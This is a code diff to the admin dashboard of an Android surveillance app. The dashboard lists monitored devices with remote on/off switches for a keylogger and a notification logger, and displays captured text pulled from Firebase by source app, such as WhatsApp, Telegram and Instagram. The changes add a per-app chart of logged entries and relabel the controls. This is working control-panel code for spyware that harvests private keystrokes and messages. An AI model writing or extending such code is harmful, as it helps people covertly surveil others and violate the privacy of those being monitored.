@@ -28,6 +28,7 @@ class AdminMainActivity : AppCompatActivity() {
     private lateinit var recyclerView: RecyclerView
     private lateinit var txtTotalDevices: TextView
     private lateinit var txtTotalEvents: TextView
+    private lateinit var horizontalBarChartView: HorizontalBarChartView
     private lateinit var lineChartView: LineChartView
 
     private val deviceList = mutableListOf<DeviceModel>()
@@ -58,6 +59,7 @@ class AdminMainActivity : AppCompatActivity() {
 
         txtTotalDevices = findViewById<TextView>(R.id.txtTotalDevices)
         txtTotalEvents = findViewById<TextView>(R.id.txtTotalEvents)
+        horizontalBarChartView = findViewById<HorizontalBarChartView>(R.id.horizontalBarChartView)
         lineChartView = findViewById<LineChartView>(R.id.lineChartView)
 
         val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
@@ -92,6 +94,7 @@ class AdminMainActivity : AppCompatActivity() {
         dbRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val allEntries = mutableListOf<LogEntry>()
+                val appCounts = mutableMapOf<String, Int>()
                 val hourlyCounts = FloatArray(24) { 0f }
                 val calendar = Calendar.getInstance()
                 val todayDayOfYear = calendar.get(Calendar.DAY_OF_YEAR)
@@ -116,6 +119,7 @@ class AdminMainActivity : AppCompatActivity() {
                             val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
                             if (text.isNotBlank() && text != "null") {
                                 allEntries.add(LogEntry(timestampMillis, prettyApp, text))
+                                appCounts[prettyApp] = (appCounts[prettyApp] ?: 0) + 1
 
                                 calendar.timeInMillis = timestampMillis
                                 if (calendar.get(Calendar.DAY_OF_YEAR) == todayDayOfYear) {
@@ -133,7 +137,11 @@ class AdminMainActivity : AppCompatActivity() {
                 txtTotalEvents.text = allEntries.size.toString()
                 adapter.notifyDataSetChanged()
 
-                // Update Line Chart with today's hourly activity
+                // Update Horizontal Bar Chart for App Logging Volume
+                val barChartData = appCounts.entries.sortedByDescending { it.value }.map { it.key to it.value }
+                horizontalBarChartView.setData(barChartData)
+
+                // Update Line Chart for Today's Activity Trend
                 val chartPoints = hourlyCounts.toList()
                 val timeLabels = listOf("12AM", "3AM", "6AM", "9AM", "12PM", "3PM", "6PM", "9PM")
                 lineChartView.setData(chartPoints, timeLabels)
@@ -185,14 +193,14 @@ class AdminMainActivity : AppCompatActivity() {
 
     private fun getPrettyAppName(pkg: String): String {
         return when {
-            pkg.contains("whatsapp", true) -> "🟢 WhatsApp"
-            pkg.contains("chrome", true) -> "🌐 Chrome"
-            pkg.contains("youtube", true) -> "🔴 YouTube"
-            pkg.contains("instagram", true) -> "📸 Instagram"
-            pkg.contains("dialer", true) -> "📞 Phone"
-            pkg.contains("telegram", true) -> "✈️ Telegram"
-            pkg.contains("settings", true) -> "⚙️ Settings"
-            else -> "📱 ${pkg.substringAfterLast('.')}"
+            pkg.contains("whatsapp", true) -> "WhatsApp"
+            pkg.contains("chrome", true) -> "Chrome"
+            pkg.contains("youtube", true) -> "YouTube"
+            pkg.contains("instagram", true) -> "Instagram"
+            pkg.contains("dialer", true) -> "Phone"
+            pkg.contains("telegram", true) -> "Telegram"
+            pkg.contains("settings", true) -> "Settings"
+            else -> pkg.substringAfterLast('.')
         }
     }
 
@@ -260,22 +268,22 @@ class AdminMainActivity : AppCompatActivity() {
 
         override fun onBindViewHolder(holder: ViewHolder, position: Int) {
             val device = devices[position]
-            holder.txtName.text = "NODE // ${device.name}"
+            holder.txtName.text = "📱 Device: ${device.name}"
 
             if (device.keylogging) {
-                holder.btnKey.text = "KEY_LOG: ON"
-                holder.btnKey.setBackgroundColor(Color.parseColor("#238636"))
+                holder.btnKey.text = "Key Logger: ON"
+                holder.btnKey.setBackgroundColor(Color.parseColor("#388E3C"))
             } else {
-                holder.btnKey.text = "KEY_LOG: OFF"
-                holder.btnKey.setBackgroundColor(Color.parseColor("#DA3633"))
+                holder.btnKey.text = "Key Logger: OFF"
+                holder.btnKey.setBackgroundColor(Color.parseColor("#C62828"))
             }
 
             if (device.notifications) {
-                holder.btnNotif.text = "NOTIF_LOG: ON"
-                holder.btnNotif.setBackgroundColor(Color.parseColor("#238636"))
+                holder.btnNotif.text = "Notif Logger: ON"
+                holder.btnNotif.setBackgroundColor(Color.parseColor("#388E3C"))
             } else {
-                holder.btnNotif.text = "NOTIF_LOG: OFF"
-                holder.btnNotif.setBackgroundColor(Color.parseColor("#DA3633"))
+                holder.btnNotif.text = "Notif Logger: OFF"
+                holder.btnNotif.setBackgroundColor(Color.parseColor("#C62828"))
             }
 
             holder.scrollView.setOnTouchListener { v, event ->
